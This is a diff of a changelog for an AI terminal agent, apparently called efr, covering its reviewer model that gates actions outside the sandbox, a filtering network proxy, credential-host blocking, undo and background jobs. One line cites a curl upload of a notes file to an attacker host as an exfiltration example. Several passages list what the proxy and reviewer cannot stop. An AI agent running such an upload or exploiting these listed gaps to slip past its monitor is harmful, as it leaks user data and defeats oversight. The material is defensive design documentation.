@@ -12,404 +12,355 @@ into the GitHub release notes, and it stops when the section is missing.
 
 ### Added
 
-- efrd now keeps a search index of your conversations: the titles, your prompts, the
-  model's answers and the commands that the agent ran, never the output of a command, the
-  contents of a file or the text of a heredoc. Before text goes into the index, efr removes
-  the secrets that it recognises: keys with a known start, long random words, tokens,
-  passwords in URLs and in assignments, private keys, and `name: value` secrets in config
-  text. It cannot recognise every secret. After the upgrade, efrd indexes your old
-  conversations in the background; until it ends, a search shows how far it is.
-- `efr search <words>` prints the conversations that match, best first, with the
-  matching text.
-- `,resume` opens a live search picker when fzf 0.46 or newer is installed (an optional
-  program, as bubblewrap is). It shows below the command line, never full screen, and
-  clears itself when it closes. Type to search the titles and the text of your
-  conversations; the preview shows the matching lines. Enter continues the conversation
-  here, Ctrl-O prints it like `efr history`, Esc closes. Without fzf, `,resume` shows the
-  numbered list as before. `[resume] picker = "list"` turns the picker off.
-- Full mode, a fourth permission mode: commands run as you, with no sandbox and no
-  questions. Turn it on by hand with `permissions.allow_full = true` in `config.toml`,
-  then choose it with `,mode full` in a terminal, `--mode=full` for one prompt, or
-  `permissions.mode = "full"` as the default. efr reads each command line: it denies
-  secrets, its own config and its own dirs, asks before a line reads or writes a whole
-  dir with a secret or efr's config below it (`rg TOKEN ~/.aws`, `du ~`), and asks
-  before `sudo`, before a process
-  that outlives the turn, before a delete of `~`, `/`, a system dir or a project (the
-  question waits 2 minutes, and only your own machine answers it), and before a delete
-  that undo cannot revert. It takes its snapshot before each call and copies a file
-  outside the project first when the line names it, so `efr undo` reverts the project
-  and the files that efr saw. A script or a program that a line starts is not read: it
-  can do what you can, also answer efr's questions. A phone turn, a turn that a job
-  notice starts, an efrd that runs as root and a hidden shell that is no zsh never run
-  in full mode, and a steer from the phone never goes into a running full turn. When you turn full mode off while a full turn runs, its next call does
-  not run and the turn stops. When you turn full mode off, efrd also stops each
-  background job that a full call started (`stopped: full mode was turned off`), with
-  no job notice turn. Full mode offers no protection against prompt injection
-  or a mistake in a script.
 - In `auto`, a reviewer model now decides most actions that leave the sandbox, so you
-  see far fewer questions. It reads your messages and the facts that efr collects, and
-  never the output of a command. It allows an action that fits what you asked, refuses
-  an action that nothing you said relates to, and gives an unsure case to you. While it
-  works, the status row shows `reviewing: <command>`. Its answer shows as one line,
-  `reviewer allowed: ...` or `reviewer refused: ...`. The reviewer is the small model
-  of your provider (`gpt-6-luna` for OpenAI, `claude-haiku-5-5` for Claude). When that
-  model is missing or refuses, the turn's model reviews, and then you decide. Each
-  review is one more request to your provider; with an API key, you pay for it. The new
-  `[classifier]` keys turn it off (`enabled = false`), and set the model, the effort
-  and the timeout of each step (20 seconds).
-- The reviewer only reviews. You still decide every `sudo`, a delete of your home
-  directory, `/`, a system directory or more than one project, a read of a masked
-  file, a write to a synced folder, a desktop command that types or starts programs,
-  and a change of the settings. An upload, such as `git push`, and a delete above the
-  project go to the reviewer only when a message of yours names them.
-- In `auto`, efr can change a file that runs code later, such as `~/.zshrc` or a
-  Hyprland config, when you name it, such as "add an alias to my zshrc" or "change the
-  gap in my hyprland config". The reviewer decides, and it sees the change that efr
-  will write. A whole directory still asks you, and so do the unit, cron and linger
-  changes that the next entry does not name. efr copies the file first, and at the end
-  of the turn each such file gets one line: `changed ~/.zshrc; efr undo reverts it`.
-  A file that two calls changed also gets one line, in the view and in `efr history`.
-  The line comes also when the turn failed or you interrupted it.
-- In `auto`, the reviewer can now allow a change that you name to a unit
-  (`systemctl --user enable`, `mask`), a link into a `*.wants` directory, the autostart
-  directory, your crontab and linger, when it can read what the change installs. efr
-  copies the links, the crontab or the linger setting first, so `efr undo` brings them
-  back. The reviewer also reads each unit that the unit's `Also=` names. A unit file
-  or a link to it that changed in the turn asks you. `systemctl --user link`, `edit`,
-  `revert`, `at` and `systemd-run --user` still ask you. efr runs `crontab` and
-  `loginctl` itself only when root owns them and their directory; else these forms
-  ask you. `loginctl enable-linger` with your own user name or uid counts as the form
-  with no user. `crontab -l` only reads your crontab, so the reviewer can let the model
-  read it before it writes all of it with `crontab -`.
-- A prompt now tells the model the recent commands of your terminal, after the last
-  command: each one with its exit status, its directory when that is not the current
-  one, and how long ago it ended. The zsh plugin keeps the last 10 command lines of
-  each terminal, but never a `,` line, an `efr` command or a line that starts with a
-  space. A line that starts with a space is not sent as the last command either. The
-  new key `context.recent_commands` sets how many the model sees (8 by
-  default, 0 for none). Like the last command, they go to the model with their secrets
-  redacted, and never into the event log. The plugin keeps the first 2,000 characters
-  of each line and at most 64 KiB of recent commands, so a very long line never stops
-  a `,` line.
-- `efr away` and `,away` tell efr that you are away from the conversation of this
-  terminal. efr also counts you away after 10 minutes without input in the
-  conversation (`presence.away_after_minutes`). While you are away, the status row of a
-  running turn shows `away`, and a question waits 5 minutes
-  (`presence.away_wait_secs`), also a question that already waited when you left. Then
-  the call does not run, and the model goes on without it and names it in its answer.
-  Your next input ends the away state.
+  see far fewer questions. It reads your messages and the facts that efr collects,
+  never the output of a command. It allows an action that fits what you asked,
+  refuses an action that nothing you said relates to, and gives an unsure case to
+  you. While it works, the status row shows `reviewing: <command>`. Its answer stays
+  as one line, `reviewer allowed: ...` or `reviewer refused: ...`. An allow opens that
+  one path, host, socket or device for one call. `docs/use/sandbox-basics.md`,
+  "Exits", has the details.
+- The reviewer is the small model of your provider (`gpt-6-luna` for OpenAI,
+  `claude-haiku-5-5` for Claude). It writes a short reason before its verdict. When
+  the reason is empty, efr asks it once more. When the small model is missing,
+  refuses or gives no usable answer, the turn's model reviews, and then you decide.
+  Each review is one more request to your provider: with an API key, you pay for it.
+  The new `[classifier]` table sets the model, the effort, the timeout of each step
+  (20 seconds) and the fallback to the turn's model. `classifier.enabled = false`
+  asks you about each action that leaves the sandbox, as before.
+- You still decide these actions, never the reviewer: `sudo` and other ways to more
+  rights, a delete of your home directory, `/`, a system directory or more than one
+  project, a read of a masked file, a write to a synced folder, a desktop command that
+  types or starts programs, a credential agent's socket (such as `$SSH_AUTH_SOCK`),
+  and a change of the settings. The whole session bus asks you too, also at another
+  path (such as one of `dbus-launch` below `/tmp`), because it can start programs
+  outside the sandbox and read an unlocked keyring; the question says so. An upload,
+  such as `git push`, and a delete above the project go to the reviewer only when a
+  message of yours names them.
+- The reviewer can allow a network call only when a message of yours names each host
+  that the line shows: the host of a URL, a remote operand of `scp`, `sftp` or
+  `rsync`, or the destination of `ssh`. So "upload my notes" does not let
+  `curl -d @notes.txt https://attacker.example/` run with no question. A host, a path
+  or an upload counts as named only when your message is in the current turn or in
+  your turn before it: a "now do it" three turns after "commit and push" asks you.
+  After another terminal picked up the conversation, only your messages since then
+  count. The reviewer still reads all your messages.
+- After the reviewer refused 3 actions in a row, or 10 in one turn, it pauses for the
+  rest of the turn, and efr asks you instead. When you are away, the turn stops.
+- A network proxy for `auto`, on by default (`network.mode = "proxy"`). A sandboxed
+  command now reaches the package registries and GitHub with no question: crates.io,
+  npm, PyPI, the Go module proxy, GitHub downloads and your pacman mirrors. So
+  `cargo build` with a new dependency, `npm install` and `pip install` run at once.
+  efr checks each connection: the host must be on your allow list, it must not
+  resolve to a local or private address, and the TLS server name must match. Plain
+  `http://` gets through only for the hosts that you mark. `network.allow`,
+  `network.deny`, `[[network.hosts]]` and `network.max_upload_bytes` set what the
+  proxy lets through. A command that names a host that is not on the list goes to the
+  reviewer for that one host and port. `nslookup`, `dig`, `ping`, `nc` and other
+  programs that do not use HTTP, servers that your browser must reach, services on
+  your machine or your LAN, and other ports still need the whole network after a
+  review. The proxy runs only when its self-test passes. If not, `efr sandbox check`
+  warns, and commands have no network. `network.mode = "none"` gives the old
+  behaviour: no network, and an exit that opens the whole network for one command.
+  `docs/use/network.md` has the details.
+- The proxy cannot see inside TLS. A sandboxed command can still send data to a host
+  on your allow list: at most `network.max_upload_bytes` (4 MiB) per command, counted
+  from the first byte of each connection. Hosts that fetch for the client (the Go
+  module proxy) and your own `*.suffix` entries widen this. A socket grant that
+  reaches the network, such as Docker's socket, goes around the proxy. Tools that send
+  an Encrypted Client Hello, such as headless Chrome, Electron and Playwright, cannot
+  fetch through the proxy. Node's `fetch` uses the proxy through
+  `NODE_USE_ENV_PROXY=1`, so Node prints an "experimental" warning on stderr in
+  sandboxed commands. `docs/sandbox.md`, "What the proxy cannot stop", lists the
+  limits.
+- With the proxy, efr blocks a host for sandboxed commands, and says why, when a file
+  or a helper can give the command a token for that host. This covers a password or a
+  token for the host in your git config (also `~/.gitconfig` and its includes, also
+  for a command outside a project) or in the project's `.npmrc`, `.yarnrc.yml`,
+  `.yarnrc`, `bunfig.toml` or `.cargo/config.toml`. It also covers a git credential
+  helper that can hand out a token: a `!` command, or a helper that efr does not know
+  (not `libsecret`, `store`, `cache` or `manager`), such as `oauth` or
+  `pass-git-helper`. The note names the helper. A helper for one site blocks only that
+  site. A helper for every site blocks the hosts of the repository's remotes. A
+  `gh auth git-credential` helper blocks no host while the sandbox hides gh's token,
+  so `git clone` and `git fetch` from GitHub work in the sandbox. Move a token to a
+  file that the sandbox hides, such as `~/.npmrc`. A socket grant to git's credential
+  cache asks only you. `efr sandbox check` warns about each `sandbox.env_keep` entry
+  that looks like a secret, because the proxy lets it reach the allowed hosts.
+- A command that the proxy refused shows `network: blocked <host:port> (<reason>)`,
+  and the model reads why. A host on the deny list, or a host that efr blocks for a
+  token, shows `denied for this command`, and the model reads that no host grant
+  helps. A background job lists its refusals in the line of its end, in the view, in
+  `efr history` and in `efr jobs stop`. The reviewer sees the hosts that the proxy
+  refused in the last command and in the jobs, but only as a fact, never as your
+  request. A denied host is not one of them.
+- `efr undo` takes back the newest turn of this terminal's conversation. It shows
+  what it will do (restore, trash, delete, ref) and asks `undo? y = yes, n = no`. It
+  restores the files that the turn's commands changed in the project, in `$SCRATCH`,
+  in the other projects that the turn wrote and outside the projects, and the
+  branches that the turn moved. It also removes the empty directories that the turn
+  made outside the project, such as a `*.wants` directory. A file that changed after
+  the turn stays, and the preview lists it; `--force` overwrites it. When only
+  `--force` acts on the rows of the preview, `efr undo` without it changes nothing
+  and fails with that hint. A change that you made during the turn between two
+  commands stays. `--redo` takes back the undo. `--list`, `--turn` and `--dry-run`
+  help you pick. Without a terminal, `efr undo` needs `--yes`.
+  `docs/use/undo-and-diff.md` has the details.
+- `efr undo` keeps your git index as it is. Every file that undo overwrites or removes
+  goes to `~/.local/share/efr/undo-trash/` first, and a directory that undo makes
+  again gets mode 0700. An undo that stops at a write that fails says
+  `undo stopped: ...`, and the next `efr undo` finishes it. An undo that can write
+  nothing leaves the turn as it is. The preview of a `manual` or `cautious` turn says
+  that writes outside the project are not covered.
+- After a stop of efrd, or for a call that you interrupted or that ran past its
+  timeout, `efr undo --force` takes back the changes of the turn's calls, also those
+  of `write_file`, `edit` and `apply_patch`. Such a turn says
+  `not covered: <project> (a call did not finish)` or
+  `<path> (the call did not finish)`.
+- `efr undo` refuses while a background job of the conversation runs, or while a job
+  of another conversation can write in the same project, and names the job:
+  `job j3 runs; stop it first (efr jobs stop j3)`. A job outside the sandbox can write
+  everywhere, so it blocks every undo. When a job ends, its file changes join the turn
+  that started it, and the undo of that turn needs `--force`. A file that a later turn
+  changed in the meantime stays with that turn. When the job notice turn of a job's
+  end changed nothing, `efr undo` with no `--turn` passes over it and takes back the
+  job's turn. Snapshots leave `$SCRATCH/jobs` out.
+- Undo also covers files outside the project in `auto`. Before efr writes a file
+  outside the project and `$SCRATCH`, such as `~/.zshrc` or `~/Documents/notes.md`,
+  or deletes a cache, it copies the file into its snapshot store. A file that did not
+  exist before goes to the undo trash. A directory with more than
+  `snapshot.home_max_files` files (2000) or `snapshot.home_max_mib` MiB (256) gets no
+  copy, and the end of the turn says so. For a directory that holds a git repository,
+  such as `~/notes` with `~/notes/.git`, efr copies the files but not the `.git`, and
+  the end of the turn says that undo does not cover `~/notes/.git`.
+- At the end of an `auto` turn, one line says what changed and that you can take it
+  back: `changed 4 files (+12 -3) in <project> and 2 in ~; efr undo reverts this turn`.
+  A turn that only moved refs says
+  `moved 1 ref in <project>; efr undo reverts this turn`. A file inside the project,
+  such as `.env`, belongs to the project's snapshot, also when the sandbox hides it.
+  Files that undo cannot bring back, such as a large ignored file, show on a line
+  `not covered: ...`. The lines come also when the turn failed or you interrupted it.
+  `efr history` shows the same lines; for a turn that undo cannot take back, it shows
+  the line of the changed files, such as `3 files changed, +24 -7`. `efr history`
+  shows each undo as one line, and `--verbose` adds each snapshot.
+- New keys for undo: `undo.enabled`, `snapshot.mirror_max_mib`,
+  `snapshot.home_max_files` and `snapshot.home_max_mib`.
 - When a command in `auto` deletes files in a tool cache, such as `~/.cache` or
   `~/.cargo`, the reviewer decides whether efr deletes them in your real cache too. So
   "free some disk space" frees real space. efr never deletes below `~/.cargo/bin`, a
   cargo config or a credentials file. The call shows the freed size.
-- Undo also covers files outside the project. Before efr writes a file outside the
-  project and `$SCRATCH` in `auto`, such as `~/.zshrc` or `~/Documents/notes.md`, or
-  deletes a cache, it copies the file into its snapshot store. A file that did not
-  exist before goes to the undo trash. A directory with more than
-  `snapshot.home_max_files` files (2000) or `snapshot.home_max_mib` MiB (256) gets no
-  copy, and the end of the turn says so.
-- After the reviewer refused 3 actions in a row, or 10 in one turn, it pauses for the
-  rest of the turn, and efr asks you instead. When you are away, the turn stops.
-- `efr history` shows the lines of the reviewer, its pause, the expiry of a question
-  while you were away, the space that a cache delete freed and each changed file that
-  runs code later. `efr history --verbose` adds the model of each review, the step of
-  its chain, its time and the models that it skipped.
-- A turn that ends with no answer says why, such as `the model stopped with no answer
-  (stop: refusal)`. An answer that reached the output limit says so too.
-- The journal of efrd has a line for a failed or interrupted turn, and the request id
-  of a model call that failed.
-- `efr undo` takes back the newest turn of this terminal's conversation. It shows
-  what it will do (restore, trash, delete, ref) and asks `undo? y = yes, n = no`. It
-  restores the files that the turn's commands changed in the project, in `$SCRATCH` and
-  in the other projects that the turn wrote, and the branches that the turn moved. A
-  file that changed after the turn stays, and the preview lists it; `--force`
-  overwrites it. When only `--force` acts on the rows of the preview, `efr undo`
-  without it does not ask, changes nothing and fails with that hint. A change that you made during the turn between two commands stays.
-  `--redo` takes back the undo. `--list`, `--turn` and `--dry-run` help you pick. Your
-  git index stays as it is. Every file that undo overwrites or removes goes to
-  `~/.local/share/efr/undo-trash/` first, and a directory that undo makes again gets
-  mode 0700. Without a terminal, `efr undo` needs `--yes`. The preview of a `manual` or
-  `cautious` turn says that writes outside the project are not covered. An undo that
-  stops at a write that fails says `undo stopped: ...`, and the next `efr undo`
-  finishes it. An undo that can write nothing leaves the turn as it is.
-- After a stop of efrd, or for a call that you interrupted or that ran past its
-  timeout, `efr undo --force` takes back the changes of the turn's calls, also those
-  of `write_file`, `edit` and `apply_patch`. Such a turn says `not covered: <project>
-  (a call did not finish)` or `<path> (the call did not finish)`.
-- At the end of an `auto` turn, one line says what changed and that you can take it
-  back: `changed 4 files (+12 -3) in <project> and 2 in ~; efr undo reverts this
-  turn`. A file that runs code later gets its own line, `changed ~/.zshrc; efr undo
-  reverts it`, and the turn's line does not count it again. A file inside the project,
-  such as `.env`, belongs to the project's snapshot, also when the sandbox hides it. Files that undo cannot bring back, such as a large ignored file, show
-  on a line `not covered: ...`. A turn that only moved refs says `moved 1 ref in
-  <project>; efr undo reverts this turn`. The lines come also when the turn failed or
-  you interrupted it. `efr history` shows each undo as one line, and `--verbose` adds
-  each snapshot.
-- New keys: `undo.enabled`, `snapshot.mirror_max_mib`, `snapshot.home_max_files`,
-  `snapshot.home_max_mib` and `sandbox.ask_destructive`.
-- Background jobs. The model can start a long command, such as a dev server, a
-  watcher or a slow build, as a job with `background: true`. The call answers at once
-  with the job's id and its output file. In `auto` the job runs in the same sandbox as
-  a normal command; in `cautious` and `manual` efr asks you before each job starts,
-  and the job runs as an approved command does. A job runs at low CPU and disk
-  priority, with no terminal. efr writes its output to `$SCRATCH/jobs/<id>.out`: the
-  first 1 MiB and the last 8 MiB. A job outside the sandbox keeps the variables that
-  place efr's own dirs (`EFR_HOME`, `EFR_RUNTIME_DIR` and the others), so an `efr` in
-  it reaches the efrd that runs it; so does a command outside the sandbox. A job ends
-  when its command ends, when you or the model stop it, after its time limit (60
-  minutes unless the model asks for more, at most `jobs.max_minutes`), or when efrd
-  stops. After a restart, efrd ends each job that still ran. Esc and the end of a turn
-  do not stop a job. At most
-  `jobs.max_running` jobs run per conversation and `jobs.max_running_daemon` in all.
-  The model reads and stops its jobs with the tools `jobs` and `job_stop`; a `watch`
-  pattern names output lines that the model must hear about.
-- efr removes the output file of a job 7 days after the job ended, and keeps at most
-  the 20 newest outputs of ended jobs per conversation.
+- Background jobs. The model can start a long command, such as a dev server, a watcher
+  or a slow build, as a job with `background: true`. The call answers at once with the
+  job's id and its output file. In `auto`, the job runs in the same sandbox as a normal
+  command. In `cautious` and `manual`, efr asks you before each job starts, and the job
+  runs as an approved command does. A job runs at low CPU and disk priority, with no
+  terminal. efr writes its output to `$SCRATCH/jobs/<id>.out`: the first 1 MiB and
+  the last 8 MiB. A job ends when its command ends, when you or the model stop it,
+  after its time limit (60 minutes unless the model asks for more, at most
+  `jobs.max_minutes`), or when efrd stops. After a restart, efrd ends each job that
+  still ran. Esc and the end of a turn do not stop a job. The model reads and stops
+  its jobs with the tools `jobs` and `job_stop`. `docs/use/jobs.md` has the details.
 - New keys for background jobs: `jobs.enabled`, `jobs.default_minutes`,
   `jobs.max_minutes`, `jobs.max_running`, `jobs.max_running_daemon`,
   `jobs.max_wakes_per_hour`, `jobs.max_wakes_per_hour_daemon`,
-  `jobs.max_wakes_per_watch` and `jobs.nice`.
-- To give a job your shell's environment, the hidden shell writes its exported
-  variables to an `env` file (0600) in efr's runtime dir at each prompt where they
-  changed. It also writes its functions, aliases and options for the sandbox at such a
-  prompt, not only before a command in `auto`.
-- The reviewer knows when an action starts a background job: what it allows stays
-  open for the whole job, so it judges the command for its whole time limit. In a turn
-  that a job notice started, it allows only what an earlier message of yours asks for.
-- A question about a background job names how long the job and what a yes opens
-  last: `runs as a job for up to 60 minutes; these grants stay open until it ends`.
-  Only your own terminal answers it, never a phone. Outside `auto`, each job asks you
-  before it starts.
+  `jobs.max_wakes_per_watch`, `jobs.nice` and `jobs.forward_ports`.
+- efr refuses a background job whose line asks for sudo, reads a masked file such as
+  `.env`, types into your desktop, uses the D-Bus bus (except the read-only queries of
+  the bus filter), a container engine or a service manager socket, runs `nmcli` or
+  `iwctl`, or changes a file that runs code later, such as `~/.zshrc`. This holds in
+  every mode, also after you answer yes. The model must run such a part in the
+  foreground. Outside `auto`, an approved job runs with your rights, so a program that
+  it starts can still do these things; only a setuid program cannot give it more
+  rights. In `auto`, a delete that undo covers still goes to the reviewer when it runs
+  as a job.
+- A question about a background job says how long the job and what a yes opens last:
+  `runs as a job for up to 60 minutes; these grants stay open until it ends`. Only
+  your own terminal answers it, never a phone. What the reviewer allows also stays
+  open for the whole job, so it judges the job's command for its whole time limit. In
+  a turn that a job notice started, it allows only what an earlier message of yours
+  asks for.
 - When a background job ends, efr tells the model with a job notice. A notice is never
   your input: it never answers a question and never counts as your permission. When
   the conversation is idle, the notice starts a short turn, marked
-  `(job notice, not your input)`, in every mode, at most `jobs.max_wakes_per_hour` times per hour in
-  the conversation and `jobs.max_wakes_per_hour_daemon` times per hour in all. Such a
-  turn runs at most 20 tool calls, and a job that it starts never starts another one.
-  A question in such a turn waits only the away wait unless you follow the
-  conversation. Its card has `(job notice turn)` in the title, such as `? allow this
-  command (job notice turn)`, and shows the command and why it asks, as any question
-  does. A `watch` pattern can also wake the model on a matching output line.
-  The turn runs in the mode of your newest prompt, so outside `auto` its commands ask
-  you as usual. Every end of a job starts such a turn, also a stop by you. Only the
+  `(job notice, not your input)`, in every mode, at most `jobs.max_wakes_per_hour`
+  times per hour in the conversation and `jobs.max_wakes_per_hour_daemon` times in
+  all. Such a turn runs at most 20 tool calls, and a job that it starts never starts
+  another one. It runs in the mode of your newest prompt, at most `auto`, so outside
+  `auto` its commands ask you as usual. A question in such a turn waits only the away
+  wait unless you follow the conversation, and its card has `(job notice turn)` in
+  the title. A `watch` pattern can also wake the model on a matching output line. The
   notice of a job that the model stopped, or that efrd stopped because full mode went
-  off, starts no turn: the model read the output when it stopped the job, and a turn
-  must not run in the mode that you turned off. A notice over the limits rides in your
-  next prompt.
-- While a job runs in the sandbox, efr checks the git settings and hooks in its
-  projects every 5 minutes and before each sandboxed command there: also those of the
-  submodules at any depth, of the git dir that a `.git` file names, and of the include
-  files and the `core.hooksPath` dir that their config names. When the job
-  planted a hook or a git setting that runs code, efr moves it to the quarantine and
-  stops the job. After a restart, efr checks a job that the last efrd left running.
-  Before a git or upload line runs outside the sandbox, efr checks every running job
-  in the sandbox, not only the jobs of the line's projects.
-- While efr follows a turn, the view shows a line when a job starts, such as `job j3
-  started; output $SCRATCH/jobs/j3.out; ends in 60 minutes`, and when a job of the
-  conversation ends, such as `job j3 ended with exit 3 after 1 minute; 2.0 KB output`.
-  The line also says when processes of the job may still run, and why a job notice
-  did not start a turn. A call that starts a job shows `(background)`. A turn that a
-  job notice started shows `🤖 (job notice, not your input)`, in the view and in `efr
-  history`. `efr history --verbose` adds the last lines of a job's output and the text
-  of each notice.
+  off, starts no turn. A notice over the limits rides in your next prompt.
+- While efr follows a turn, the view shows a line when a job starts, such as
+  `job j3 started; output $SCRATCH/jobs/j3.out; ends in 60 minutes`, and when a job of
+  the conversation ends, such as `job j3 ended with exit 3 after 1 minute; 2.0 KB
+  output`. The line also says when processes of the job may still run, and why a job
+  notice did not start a turn. A call that starts a job shows `(background)`. A turn
+  that a job notice started shows `🤖 (job notice, not your input)`, in the view and
+  in `efr history`. `efr history --verbose` adds the last lines of a job's output and
+  the text of each notice.
 - In a terminal that does not follow the conversation, the next prompt shows one line
-  when a job ends, such as `efr: job j3 ended (exit 0): <title>`, and when a job notice
-  waits for your next prompt, such as `efr: job j3 waits for your next prompt: <title>;
-  no wake turn (wake limit reached)`. The line also names a lost launcher and the
-  processes of the job that may still run. After a job notice turn, the line names the
-  jobs and the first line of the answer: `efr: job notice turn finished (job j3): <title>:
-  <first line>; efr history shows all`. After a restart, efrd writes a line for
-  each job that it ended. A notice from before your terminal opened, such as one for an
-  earlier terminal of the same name before a reboot, does not show.
+  when a job ends, such as `efr: job j3 ended (exit 0): <title>`, or when its notice
+  waits for your next prompt. The line also names a lost launcher and the processes of
+  the job that may still run. After a job notice turn, the line names the jobs and the
+  first line of the answer. After a restart, efrd writes a line for each job that it
+  ended. A notice from before your terminal opened does not show.
+- `efr jobs` (or `efr jobs list`) lists the jobs of this terminal's conversation,
+  newest first: the id, the state, when it ends or ended, the size of its output, its
+  ports and its command. `--all` lists the jobs of every conversation with its title,
+  and `--conversation` names another one. `efr jobs stop <id>` stops a job and shows
+  how it ended and the last 10 lines of its output. An unknown job exits 1. efr removes
+  the output file of a job 7 days after the job ended, and keeps at most the 20 newest
+  outputs of ended jobs per conversation.
 - In the input row of a followed turn, Ctrl+X stops the newest running job of the
   conversation. It asks first: `stop job j3 (npm run dev)`, `y` yes, `n` no. With no
-  running job it says `no job runs`. Esc still stops only the turn, never a job.
-- `efr jobs` (or `efr jobs list`) lists the jobs of this terminal's conversation,
-  newest first: the id, the state, when it ends or ended, the size of its output and
-  its command. `--all` lists the jobs of every conversation with its title, and
-  `--conversation` names another one. `efr jobs stop <id>` stops a job and shows how
-  it ended and the last 10 lines of its output. An unknown job exits 1.
-- In `auto`, a loopback port that a contained background job listens on is now
-  reachable on the same port of `127.0.0.1` on your machine, so your browser opens a
-  dev server that the model started. The view shows `job j1 listens on
-  127.0.0.1:8765 -> http://localhost:8765`, and `efr jobs` lists the ports. efr forwards
-  ports from 1024 up, never a port that is in use on your machine, never port 3128 of a
-  proxy job, and no well-known service port, such as 5432 or 6379, or 1455 of
-  `efr login`. Only your own user's programs can connect. The forward ends with the job.
-  `jobs.forward_ports = false` turns it off. A foreground call gets no forward. UDP is
-  not forwarded. Before, the browser could reach such a server only after a review
-  that gave the job the whole network. `docs/sandbox.md`, "Ports of a job", has the
-  details and the limits.
-- In `auto`, a contained command reaches the forwarded ports of its conversation's
-  background jobs at `127.0.0.1` and `localhost` with no question, so the agent can
-  check the dev server that it started. Before, such a check asked for the whole
-  network. Only the ports that efr forwards for the same conversation are reachable.
-  `docs/sandbox.md`, "Ports of a job", has the rules.
-- In `auto`, efr no longer asks to give the whole network to a command that checks a
-  port of a background job that efr does not forward, such as a port that a program of
-  yours uses. The whole network would reach your program, not the job. Now efr does not
-  run the command, asks you nothing, and tells the agent why: `efr: port 8767 of job j1
-  is not forwarded: 127.0.0.1:8767 is in use on this machine. ...`. When the job started
-  less than 3 seconds ago, efr first waits for the outcome of the port. A port of no
-  job still asks. The other modes do not change: their commands run outside the
-  sandbox.
-- The agent now learns whether efr forwards each port of its background jobs. Before
-  its next step, also in the same turn, the model reads a note from efr. For a
-  forwarded port, the note gives the URL. For a port that efr does not forward, such as
-  a port that a program of yours uses, the note gives the reason and tells the model to
-  choose another port. So the model does not give you a URL that opens another server.
-  When a reload sets `jobs.forward_ports = false`, the model reads that each port is no
-  longer forwarded. The model reads each outcome once, and the `jobs` tool shows the
-  outcome of each port.
+  running job, it says `no job runs`. Esc still stops only the turn, never a job.
 - Ctrl+B in the turn view moves the agent's running shell call to the background as a
   job, whatever the input row holds. A call in the sandbox moves at once and keeps its
   sandbox. A call that runs outside the sandbox asks one `y/n` question first, because
-  the command keeps running with your rights after the turn. The turn goes on at once,
-  the model reads the output so far and the job's id, and a job notice follows when
+  the command keeps running with your rights after the turn. The turn goes on at once.
+  The model reads the output so far and the job's id, and a job notice follows when
   the command ends. The next call gets a new hidden shell in the same directory.
-  `efr jobs` shows when a moved command waits for input that nobody can type. In
-  tmux, press Ctrl+B twice. A command that waits for input, that can ask at the
-  terminal (such as `sudo`), or that efr does not allow as a job cannot move, and
-  neither can a call that holds the sandbox's cache. `docs/sandbox.md`, "Moving a call
-  to the background", has the details.
-- In `auto`, `df` and `findmnt` now run with no review and show your machine's
-  mounts with their real sizes, also for `/tmp`, `/dev/shm` and your runtime dir. efr
-  reads the mounts outside the sandbox. A mount that does not answer in one second
-  shows `-`, so `df` never hangs on it. `df <path>` shows where a write in the sandbox
-  goes, for example the private `/tmp`. Mounts below a hidden path show no sizes.
-  When efrd runs in a mount namespace of its own, for example because a unit drop-in
-  sets `ProtectHome`, `df` and `findmnt` go to the reviewer and run outside the
-  sandbox instead. A path or a wrapper, such as `/bin/df`, `command df` or
-  `timeout 10 df`, also goes to the reviewer, because it runs the real `df`.
-- In `auto`, `ss`, `ip addr`, `ip -s link`, `ip route`, `nstat` and reads of
-  `/proc/net` now run with no review and show your machine's real network: its
-  sockets, links, counters and routes. The command runs in the sandbox with your
-  network view but cannot open a network socket: every socket except local Unix
-  sockets and the netlink views of `ss` and `ip` fails. A line that also does other
-  work, `iw`, `ifconfig`, `netstat`, and changes such as `ip link set` still go to the
-  reviewer. A background job that watches your network now starts with no review too.
-  A new `[network]` table has one key, `netview` (default `true`); `false` sends these
-  commands to the reviewer again. The dim line at the end of such a turn says
-  `host network view (no sending)`.
-- `sandbox.keep_downloads` (default `false`): in the `tmp` cache mode, the download
-  caches (`~/.cargo`, `~/go/pkg/mod`, `~/.npm`, the bun and pnpm stores) keep what a
-  command downloads for the rest of the conversation, in efr's private layer. Your own
-  caches do not change. It is off by default because each sandboxed command then takes
-  about 3 to 4 ms more to start.
-- A network proxy for `auto`, on by default (`network.mode = "proxy"`). A sandboxed
-  command reaches the package registries and GitHub with no review: crates.io,
-  npm, PyPI, the Go module proxy, GitHub downloads and your pacman mirrors. efr checks
-  each connection: the host must be on your allow list, it must not resolve to a local
-  or private address, and the TLS server name must match. Only the hosts and ports that
-  you list get through, and plain `http://` only for the hosts that you mark. A command
-  that needs another host goes to the reviewer, which opens that one host for that one
-  command. `network.allow`, `network.deny`, `[[network.hosts]]` and
-  `network.max_upload_bytes` set what the proxy lets through. The proxy runs only when
-  its self-test passes; else `efr sandbox check` warns, and commands have no network.
-- With the proxy, a command that the proxy refused shows
-  `network: blocked <host:port> (<reason>)`, and the model reads why. A host on the
-  deny list, or one that efr blocks because a file or a credential helper can give the
-  command a token for it, shows `denied for this command`, and the model reads that no
-  host grant helps. A background job lists its refusals in the line of its end, in the
-  view, in `efr history` and in `efr jobs stop`. The dim line at the end of a turn says
-  `network through efr's proxy` in place of `no network` when a command of the turn
-  ran with the proxy, also a background job that the turn started, and `full network`
-  when a command had the whole network. When the turn changed files in projects, the
-  line names them: `sandbox: wrote in app and lib; could write $SCRATCH, private /tmp;
-  ...`. The reviewer sees the hosts that the proxy refused in the last command and in
-  the jobs, but only as a fact, never as your request; a denied host is not one of
-  them.
-- With the proxy, Node's `fetch` uses the proxy through `NODE_USE_ENV_PROXY=1`, so
-  Node prints an "experimental" warning on stderr in sandboxed commands.
-- With `[dbus] proxy = true` in `auto`, read-only system queries run with no review:
-  `hostnamectl`, `timedatectl`, `localectl`, `systemctl --failed`,
-  `systemctl status <unit>` and the other read forms, `systemctl --user --failed`,
-  `loginctl list-sessions`, and desktop notifications with `notify-send`. The command
-  reaches the system or session bus only through a filter that allows read methods and
-  the calls of `notify-send`. efr turns the filter off when `xdg-dbus-proxy` is
-  missing, older than 0.1.9, or fails its self-test; `efr status` then shows
-  `bus filter off (<reason>)`, the system bus queries go to the reviewer as before, and
-  the session bus commands ask you. Older
-  versions cannot serve `hostnamectl` and the other systemd tools, and let some
-  messages past the filter. Ubuntu 24.04 and Debian ship an older version, so there the
-  filter stays off until they ship 0.1.9.
-- With `[dbus] proxy = true`, a bus call that the filter refuses fails in the command,
